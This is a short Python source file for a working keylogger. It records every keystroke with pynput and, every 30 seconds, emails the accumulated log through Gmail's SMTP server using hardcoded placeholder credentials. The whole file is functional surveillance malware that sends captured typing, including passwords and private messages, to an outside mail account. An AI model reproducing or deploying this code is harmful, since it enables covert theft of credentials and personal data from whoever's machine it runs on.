import pynput.keyboard 
import smtplib
import threading

log = ""
def callback_function(key):
    global log
    try:
        log = log + str(key.char)
        #log = log.encode() + key.char.encode("utf-8")
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass
    print(log)
    
def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()


def thread_function():
    global log
    send_email("email@gmail.com","password",log.encode("utf-8"))
    log = ""
    timer_obj = threading.Timer(30,thread_function)
    timer_obj.start()

keylogger = pynput.keyboard.Listener(on_press=callback_function)
# threading
with keylogger:
    thread_function()
    keylogger.join()